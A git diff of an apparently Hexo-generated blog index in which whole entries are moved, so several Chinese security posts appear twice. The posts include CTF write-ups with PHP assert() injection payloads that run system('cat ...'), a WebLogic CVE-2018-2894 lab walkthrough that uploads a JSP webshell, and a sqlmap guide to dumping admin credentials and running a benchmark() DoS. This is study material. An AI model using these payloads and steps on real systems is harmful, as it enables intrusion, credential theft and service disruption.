+    <content><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;flag.php&#39;;</span><br><span class="line">$value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$username &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">    else $username .&#x3D; chr($value[$i]);</span><br><span class="line">    if ($username &#x3D;&#x3D; &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;</span><br><span class="line">        echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">        echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要传入两个变量<code>value</code>和<code>password</code>.</p>
+<p>count():返回数组中元素的数目<br>unset():销毁指定的变量<br>chr():返回相对应于 ascii 所指定的单个字符<br>.= : 拼接字符串<br>intval():通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP消息头</title>
     <url>/posts/35270.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>HTTP消息头是指，在超文本传输协议（ Hypertext Transfer Protocol ，HTTP）的请求和响应消息中，协议头部分的那些组件。HTTP消息头用来准确描述正在获取的资源、服务器或者客户端的行为，定义了HTTP事务中的具体操作参数。</p>
@@ -943,23 +960,6 @@
       <tags>
         <tag>web</tag>
         <tag>HTTP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ISCC2019-Web</title>
-    <url>/posts/25084.html</url>
-    <content><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;flag.php&#39;;</span><br><span class="line">$value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$username &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">    else $username .&#x3D; chr($value[$i]);</span><br><span class="line">    if ($username &#x3D;&#x3D; &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;</span><br><span class="line">        echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">        echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>需要传入两个变量<code>value</code>和<code>password</code>.</p>
-<p>count():返回数组中元素的数目<br>unset():销毁指定的变量<br>chr():返回相对应于 ascii 所指定的单个字符<br>.= : 拼接字符串<br>intval():通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1329,66 +1329,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Weblogic复现之任意文件上传</title>
-    <url>/posts/30478.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在复现weblogic，今天复现一下其中的任意文件上传漏洞。</p>
-<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>此漏洞涉及版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.3.6.0</span><br><span class="line">12.1.3.0</span><br><span class="line">12.2.1.2</span><br><span class="line">12.2.1.3</span><br></pre></td></tr></table></figure>
-
-<h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
-<li><p>进入该漏洞环境目录</p>
-<p><code>cd vulhub/weblogic/CVE-2018-2094</code></p>
-</li>
-<li><p>环境构建</p>
-<p><code>sudo docker-compose build</code></p>
-</li>
-<li><p>启动</p>
-<p><code>sudo docker-compose up -d</code></p>
-</li>
-</ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>访问<a href="http://your-ip:7001/console，即可看到后台登录页面" target="_blank" rel="noopener">http://your-ip:7001/console，即可看到后台登录页面</a></p>
-<p><img src="/posts/30478/1.png" alt="登录界面"></p>
-<p>在CVE-2018-2894环境目录下，查看账号密码，运行以下命令：</p>
-<p><code>sudo docker-compose logs | grep password</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost:vulhub&#x2F;weblogic&#x2F;CVE-2018-2894# docker-compose logs | grep password</span><br><span class="line">weblogic_1  |       ----&gt; &#39;weblogic&#39; admin password: ofX5JwIc</span><br><span class="line">weblogic_1  | admin password  : [ofX5JwIc]</span><br><span class="line">weblogic_1  | *  password assigned to an admin-level user.  For *</span><br><span class="line">weblogic_1  | *  password assigned to an admin-level user.  For *</span><br></pre></td></tr></table></figure>
-
-<p>输入用户名和密码，进入后台</p>
-<p>勾选在“base_domain”下的“高级”下的“启用web服务测试页”这个选项，点击保存。</p>
-<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
-<li><p>进入上传界面：<a href="http://192.168.220.141:7001/ws_utc/config.do" target="_blank" rel="noopener">http://192.168.220.141:7001/ws_utc/config.do</a></p>
-</li>
-<li><p>将“通用”下的“当前工作目录”路径设置为：</p>
-<p> <code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
-<p>为什么呢？将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的</p>
-</li>
-<li><p>上传木马</p>
-<ul>
-<li><p>进入“安全”，点击“添加”，点击“浏览”，选择你要上传的jsp木马，点击“提交”即可</p>
-<p><img src="/posts/30478/2.png" alt="上传木马"></p>
-</li>
-<li><p>按F12，选中上传文件名元素，该标签下有个id元素(时间戳)</p>
-<p><img src="/posts/30478/3.png" alt="时间戳"></p>
-</li>
-</ul>
-</li>
-<li><p>上传木马的访问路径</p>
-<p> <a href="http://your-ip:7001/ws_utc/css/config/keystore/[时间戳id]_[文件名]" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳id]_[文件名]</a></p>
-<p> 我上传的是jsp大马</p>
-<p> <img src="/posts/30478/4.png" alt="上传成功"></p>
-</li>
-<li><p>也可以上传其他木马，用菜刀、蚁剑、冰蝎等连接</p>
-</li>
-</ol>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次漏洞复现不是特别难，其中还有一些不明白的地方，比如，在时间戳那个地方，我们怎么知道它用了时间戳修改文件名等等。。。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Web渗透测试-信息收集总结</title>
     <url>/posts/44511.html</url>
     <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>信息收集分为：被动信息收集和主动信息收集。</p>
@@ -1450,6 +1390,66 @@
       </categories>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weblogic复现之任意文件上传</title>
+    <url>/posts/30478.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在复现weblogic，今天复现一下其中的任意文件上传漏洞。</p>
+<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>此漏洞涉及版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.3.6.0</span><br><span class="line">12.1.3.0</span><br><span class="line">12.2.1.2</span><br><span class="line">12.2.1.3</span><br></pre></td></tr></table></figure>
+
+<h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
+<li><p>进入该漏洞环境目录</p>
+<p><code>cd vulhub/weblogic/CVE-2018-2094</code></p>
+</li>
+<li><p>环境构建</p>
+<p><code>sudo docker-compose build</code></p>
+</li>
+<li><p>启动</p>
+<p><code>sudo docker-compose up -d</code></p>
+</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>访问<a href="http://your-ip:7001/console，即可看到后台登录页面" target="_blank" rel="noopener">http://your-ip:7001/console，即可看到后台登录页面</a></p>
+<p><img src="/posts/30478/1.png" alt="登录界面"></p>
+<p>在CVE-2018-2894环境目录下，查看账号密码，运行以下命令：</p>
+<p><code>sudo docker-compose logs | grep password</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost:vulhub&#x2F;weblogic&#x2F;CVE-2018-2894# docker-compose logs | grep password</span><br><span class="line">weblogic_1  |       ----&gt; &#39;weblogic&#39; admin password: ofX5JwIc</span><br><span class="line">weblogic_1  | admin password  : [ofX5JwIc]</span><br><span class="line">weblogic_1  | *  password assigned to an admin-level user.  For *</span><br><span class="line">weblogic_1  | *  password assigned to an admin-level user.  For *</span><br></pre></td></tr></table></figure>
+
+<p>输入用户名和密码，进入后台</p>
+<p>勾选在“base_domain”下的“高级”下的“启用web服务测试页”这个选项，点击保存。</p>
+<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
+<li><p>进入上传界面：<a href="http://192.168.220.141:7001/ws_utc/config.do" target="_blank" rel="noopener">http://192.168.220.141:7001/ws_utc/config.do</a></p>
+</li>
+<li><p>将“通用”下的“当前工作目录”路径设置为：</p>
+<p> <code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
+<p>为什么呢？将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的</p>
+</li>
+<li><p>上传木马</p>
+<ul>
+<li><p>进入“安全”，点击“添加”，点击“浏览”，选择你要上传的jsp木马，点击“提交”即可</p>
+<p><img src="/posts/30478/2.png" alt="上传木马"></p>
+</li>
+<li><p>按F12，选中上传文件名元素，该标签下有个id元素(时间戳)</p>
+<p><img src="/posts/30478/3.png" alt="时间戳"></p>
+</li>
+</ul>
+</li>
+<li><p>上传木马的访问路径</p>
+<p> <a href="http://your-ip:7001/ws_utc/css/config/keystore/[时间戳id]_[文件名]" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳id]_[文件名]</a></p>
+<p> 我上传的是jsp大马</p>
+<p> <img src="/posts/30478/4.png" alt="上传成功"></p>
+</li>
+<li><p>也可以上传其他木马，用菜刀、蚁剑、冰蝎等连接</p>
+</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次漏洞复现不是特别难，其中还有一些不明白的地方，比如，在时间戳那个地方，我们怎么知道它用了时间戳修改文件名等等。。。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1630,6 +1630,49 @@
       </tags>
   </entry>
   <entry>
+    <title>git泄露</title>
+    <url>/posts/55935.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做ctf的题，碰到了GitHack，刚好大佬学长有一道这方面的题，拿来练练手。现在总结一下。</p>
+<a id="more"></a>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="链接：http-web-jarvisoj-com-32798"><a href="#链接：http-web-jarvisoj-com-32798" class="headerlink" title="链接：http://web.jarvisoj.com:32798/"></a>链接：<a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>既然知道是git泄露了，那就废话少说，抄家伙！！！<br>下载GitHack：</p>
+<p><code>git clone https://github.com/lijiejie/GitHack</code></p>
+<p>执行GitHack：</p>
+<p> <code>python GitHack.py http://web.jarvisoj.com:32798/.git/</code></p>
+<p> <img src="/posts/55935/git1.jpg" alt><br>** <code>index.php</code>核心代码：**<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">           $page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">           $page &#x3D; &quot;home&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   $file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line">   assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">   assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p> 分析代码可以看到：</p>
+<ul>
+<li><p>需要传个<code>page</code>参数</p>
+</li>
+<li><p><code>file = &quot;templates/&quot;.$page.&quot;.php&quot;</code></p>
+</li>
+<li><p>通过<code>assert</code>函数进行了两次友好（）的判断回显，如果不符合假定，就执行<code>or</code>后面的语句</p>
+<p><code>bool assert(mixed $assertion[,string $description])</code>，如果<code>assertion</code>是字符串，他会被<code>assert()</code>当做php代码执行。会执行！！！</p>
+</li>
+</ul>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。</p>
+<ul>
+<li><p><code>&#39;) or phpinfo();#</code> ——即变成<code>file_exists(&#39;&#39;) or phpinfo();#</code> ，结果为执行<code>phpinfo()</code>，注意要url编码，本处为了方便阅读，以编码前显示</p>
+</li>
+<li><p><code>&#39;) or print_r(file_get_contents(&#39;templates/flag.php&#39;);#</code> ——然后在源代码里（临门一脚不要被坑了）</p>
+</li>
+</ul>
+<p>即构造payload1:</p>
+<p><code>?page=&#39;)%20or%20print_r(file_get_contents(&#39;templates%2fflag.php&#39;))%3b%23</code></p>
+<p><img src="/posts/55935/git2.jpg" alt></p>
+<p>payload2：</p>
+<p><code>&#39;,&#39;..&#39;)===False and system(&#39;cat templates/flag.php&#39;);//</code></p>
+<p><img src="/posts/55935/git3.jpg" alt></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这道题，了解到了GitHack，了解到了git泄露，美滋滋！！！</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>源码泄露</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker复现ctf</title>
     <url>/posts/31496.html</url>
     <content><![CDATA[<h1 id="docker复现ctf"><a href="#docker复现ctf" class="headerlink" title="docker复现ctf"></a>docker复现ctf</h1><h2 id="0x00-docker常用命令"><a href="#0x00-docker常用命令" class="headerlink" title="0x00 docker常用命令"></a>0x00 docker常用命令</h2><ol>
@@ -1706,49 +1749,6 @@
       </tags>
   </entry>
   <entry>
-    <title>git泄露</title>
-    <url>/posts/55935.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做ctf的题，碰到了GitHack，刚好大佬学长有一道这方面的题，拿来练练手。现在总结一下。</p>
-<a id="more"></a>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="链接：http-web-jarvisoj-com-32798"><a href="#链接：http-web-jarvisoj-com-32798" class="headerlink" title="链接：http://web.jarvisoj.com:32798/"></a>链接：<a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>既然知道是git泄露了，那就废话少说，抄家伙！！！<br>下载GitHack：</p>
-<p><code>git clone https://github.com/lijiejie/GitHack</code></p>
-<p>执行GitHack：</p>
-<p> <code>python GitHack.py http://web.jarvisoj.com:32798/.git/</code></p>
-<p> <img src="/posts/55935/git1.jpg" alt><br>** <code>index.php</code>核心代码：**<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">           $page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">           $page &#x3D; &quot;home&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   $file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line">   assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">   assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure></p>
-<p> 分析代码可以看到：</p>
-<ul>
-<li><p>需要传个<code>page</code>参数</p>
-</li>
-<li><p><code>file = &quot;templates/&quot;.$page.&quot;.php&quot;</code></p>
-</li>
-<li><p>通过<code>assert</code>函数进行了两次友好（）的判断回显，如果不符合假定，就执行<code>or</code>后面的语句</p>
-<p><code>bool assert(mixed $assertion[,string $description])</code>，如果<code>assertion</code>是字符串，他会被<code>assert()</code>当做php代码执行。会执行！！！</p>
-</li>
-</ul>
-<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。</p>
-<ul>
-<li><p><code>&#39;) or phpinfo();#</code> ——即变成<code>file_exists(&#39;&#39;) or phpinfo();#</code> ，结果为执行<code>phpinfo()</code>，注意要url编码，本处为了方便阅读，以编码前显示</p>
-</li>
-<li><p><code>&#39;) or print_r(file_get_contents(&#39;templates/flag.php&#39;);#</code> ——然后在源代码里（临门一脚不要被坑了）</p>
-</li>
-</ul>
-<p>即构造payload1:</p>
-<p><code>?page=&#39;)%20or%20print_r(file_get_contents(&#39;templates%2fflag.php&#39;))%3b%23</code></p>
-<p><img src="/posts/55935/git2.jpg" alt></p>
-<p>payload2：</p>
-<p><code>&#39;,&#39;..&#39;)===False and system(&#39;cat templates/flag.php&#39;);//</code></p>
-<p><img src="/posts/55935/git3.jpg" alt></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这道题，了解到了GitHack，了解到了git泄露，美滋滋！！！</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>源码泄露</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/posts/16107.html</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -1766,6 +1766,26 @@
       </categories>
       <tags>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpinfo可以告诉我们什么</title>
+    <url>/posts/41559.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章！</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="f1ec3c70e5c3c5c9ac84d25a9c966cc579d9a692635d1dfe20a34486225544aa">607f0202230253bfae7c7369de0f7e695689ba1fcf854eff38844e46219119e26c02a27b87e6e48b5dbd6709e184ca33069e84be0e262d288b5fd9efda4e0bc538e80641726506ff665d27035eff4f880c972ae1dfea8fc1ae386d7a80fdb0c9f54e971cc2cb6d60766dfb01348c52c77516e6922e642121a3e060123f6101c35507f1184310a9fddadc6a63f5ac621d2168813a995de12d824e0e30bb1189b5aa1ccedeb7798572f656fd613d9534857b61283fd792058feabd22796b527230</script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -1824,26 +1844,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;..（当前脚本的绝对路径）...&#x2F;1.jpg#1.php</span><br><span class="line">phar:&#x2F;&#x2F;...（当前脚本的绝对路径）...&#x2F;1.jpg&#x2F;1（分割不加后缀名）</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>phpinfo可以告诉我们什么</title>
-    <url>/posts/41559.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="f1ec3c70e5c3c5c9ac84d25a9c966cc579d9a692635d1dfe20a34486225544aa">607f0202230253bfae7c7369de0f7e695689ba1fcf854eff38844e46219119e26c02a27b87e6e48b5dbd6709e184ca33069e84be0e262d288b5fd9efda4e0bc538e80641726506ff665d27035eff4f880c972ae1dfea8fc1ae386d7a80fdb0c9f54e971cc2cb6d60766dfb01348c52c77516e6922e642121a3e060123f6101c35507f1184310a9fddadc6a63f5ac621d2168813a995de12d824e0e30bb1189b5aa1ccedeb7798572f656fd613d9534857b61283fd792058feabd22796b527230</script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>WEB</category>
       </categories>
       <tags>
         <tag>php</tag>
@@ -1956,134 +1956,6 @@
       </categories>
       <tags>
         <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap的基本使用</title>
-    <url>/posts/8141.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。</p>
-<a id="more"></a>
-<h2 id="一共有11种常见SQLmap使用方法："><a href="#一共有11种常见SQLmap使用方法：" class="headerlink" title="一共有11种常见SQLmap使用方法："></a>一共有11种常见SQLmap使用方法：</h2><h3 id="SQLmap用于Access数据库注入"><a href="#SQLmap用于Access数据库注入" class="headerlink" title="SQLmap用于Access数据库注入"></a>SQLmap用于Access数据库注入</h3><ul>
-<li><p>猜解是否能注入<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</code></p>
-</li>
-<li><p>猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables</code></p>
-</li>
-<li><p>根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin</code></p>
-</li>
-<li><p>根据字段猜解内容(假如通过3得到字段为username和password)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot;</code></p>
-</li>
-</ul>
-<h3 id="SQLMAP用于Cookie注入"><a href="#SQLMAP用于Cookie注入" class="headerlink" title="SQLMAP用于Cookie注入"></a>SQLMAP用于Cookie注入</h3><ul>
-<li><p>cookie注入，猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2</code></p>
-</li>
-<li><p>猜解字段，(通过1的表猜解字段，假如表为admin)<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2</code></p>
-</li>
-<li><p>猜解内容<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T
-admin -C &quot;username,password&quot; --level 2</code></p>
-</li>
-</ul>
-<h3 id="SQLMAP用于mysql中DDOS攻击"><a href="#SQLMAP用于mysql中DDOS攻击" class="headerlink" title="SQLMAP用于mysql中DDOS攻击"></a>SQLMAP用于mysql中DDOS攻击</h3><ul>
-<li><p>获取一个Shell<br><code>python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell</code></p>
-</li>
-<li><p>输入执行语句完成DDOS攻击<br><code>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</code></p>
-</li>
-</ul>
-<h3 id="SQLMAP用于mysql注入"><a href="#SQLMAP用于mysql注入" class="headerlink" title="SQLMAP用于mysql注入"></a>SQLMAP用于mysql注入</h3><ul>
-<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs</code></p>
-</li>
-<li><p>通过第一步的数据库查找表(假如数据库名为dataname)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables</code></p>
-</li>
-<li><p>通过2中的表得出列名(假如表为table_name)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns</code></p>
-</li>
-<li><p>获取字段的值(假如扫描出id,user,password字段)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C
-&quot;id,user,password&quot; --dump</code></p>
-</li>
-</ul>
-<h3 id="SQLMAP中post登陆框注入"><a href="#SQLMAP中post登陆框注入" class="headerlink" title="SQLMAP中post登陆框注入"></a>SQLMAP中post登陆框注入</h3><h4 id="其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件"><a href="#其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件" class="headerlink" title="其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件"></a>其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</h4><p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
-<ol>
-<li><p>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</p>
-</li>
-<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
-</li>
-<li><p>点击login表单的submit按钮</p>
-</li>
-<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
-</li>
-<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
-</li>
-<li><p>运行sqlmap并使用如下命令：<br><code>./sqlmap.py -r search-test.txt -p tfUPass</code></p>
-</li>
-</ol>
-<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
